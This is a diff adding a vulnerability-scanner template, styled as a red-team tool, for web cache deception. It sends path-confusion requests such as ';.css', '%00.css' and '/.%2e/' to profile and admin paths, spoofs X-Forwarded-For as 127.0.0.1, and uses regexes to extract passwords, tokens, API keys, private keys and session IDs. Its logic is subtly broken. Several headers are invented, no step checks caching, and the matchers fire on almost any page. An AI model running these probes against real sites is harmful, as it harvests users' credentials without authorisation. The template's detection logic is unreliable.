@@ -1,0 +1,374 @@
+id: medium-webapp-cache-poisoning-web-cache-deception
+
+info:
+  name: Web Cache Deception Attack - Elite Red Team
+  author: elite-red-team
+  severity: medium
+  description: |
+    Advanced web cache deception and poisoning attack techniques.
+    Tests for cache misconfigurations that allow sensitive data exposure.
+    Includes path confusion, parameter cloaking, and cache key manipulation.
+  reference:
+    - https://portswigger.net/web-security/web-cache-poisoning
+    - https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N
+    cvss-score: 6.5
+    cwe-id: CWE-524
+  tags: cache-poisoning,cache-deception,information-disclosure,red-team
+
+variables:
+  # Common static file extensions for cache deception
+  static_extensions:
+    - ".css"
+    - ".js"
+    - ".png"
+    - ".jpg"
+    - ".gif"
+    - ".ico"
+    - ".svg"
+    - ".woff"
+    - ".pdf"
+    - ".txt"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile/settings.css"
+      - "{{BaseURL}}/admin/dashboard.js"
+      - "{{BaseURL}}/user/account.png"
+      - "{{BaseURL}}/api/users.json"
+      - "{{BaseURL}}/private/data.txt"
+      - "{{BaseURL}}/secure/config.css"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+      X-Real-IP: 127.0.0.1
+      Cache-Control: no-cache
+      Pragma: no-cache
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+          - "private"
+          - "secure"
+          - "dashboard"
+          - "account"
+          - "settings"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "text/css"
+          - "application/javascript"
+          - "image/"
+          - "application/json"
+          - "text/plain"
+        condition: or
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"email":\s*"([^"]+)"'
+          - '"username":\s*"([^"]+)"'
+          - '"token":\s*"([^"]+)"'
+          - '"api_key":\s*"([^"]+)"'
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile;.css"
+      - "{{BaseURL}}/admin;.js"
+      - "{{BaseURL}}/user;.png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+      X-Cache-Bypass: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+          - "dashboard"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile%2f.css"
+      - "{{BaseURL}}/admin%2f.js"
+      - "{{BaseURL}}/user%2f.png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-For: 127.0.0.1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile/.css"
+      - "{{BaseURL}}/admin/.js"
+      - "{{BaseURL}}/user/.png"
+      - "{{BaseURL}}/api/data/.json"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Cache-Control: public, max-age=3600
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+          - "api"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile?file=.css"
+      - "{{BaseURL}}/admin?ext=.js"
+      - "{{BaseURL}}/user?type=.png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Forwarded-Proto: https
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile#.css"
+      - "{{BaseURL}}/admin#.js"
+      - "{{BaseURL}}/user#.png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Cache-Bypass: fragment
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile%00.css"
+      - "{{BaseURL}}/admin%00.js"
+      - "{{BaseURL}}/user%00.png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Null-Byte-Cache: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile%20.css"
+      - "{{BaseURL}}/admin%09.js"
+      - "{{BaseURL}}/user%0a.png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Whitespace-Cache: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile..css"
+      - "{{BaseURL}}/admin..js"
+      - "{{BaseURL}}/user..png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Double-Dot-Cache: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile/.%2e/settings.css"
+      - "{{BaseURL}}/admin/.%2e/dashboard.js"
+      - "{{BaseURL}}/user/.%2e/account.png"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Path-Traversal-Cache: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "user"
+          - "settings"
+          - "dashboard"
+          - "account"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile/;/settings.css"
+      - "{{BaseURL}}/admin/;/dashboard.js"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Semicolon-Cache: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+          - "settings"
+          - "dashboard"
+        condition: or
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/profile%2e.css"
+      - "{{BaseURL}}/admin%2e.js"
+
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+      X-Encoded-Dot-Cache: true
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "profile"
+          - "admin"
+        condition: or
+
+    extractors:
+      - type: regex
+        part: header
+        regex:
+          - 'Cache-Control:\s*([^\r\n]+)'
+          - 'X-Cache:\s*([^\r\n]+)'
+          - 'X-Cache-Status:\s*([^\r\n]+)'
+          - 'Age:\s*([^\r\n]+)'
+
+      - type: regex
+        part: body
+        regex:
+          - '"password":\s*"([^"]+)"'
+          - '"secret":\s*"([^"]+)"'
+          - '"private_key":\s*"([^"]+)"'
+          - 'sessionId["\']:\s*["\']([^"\']+)'
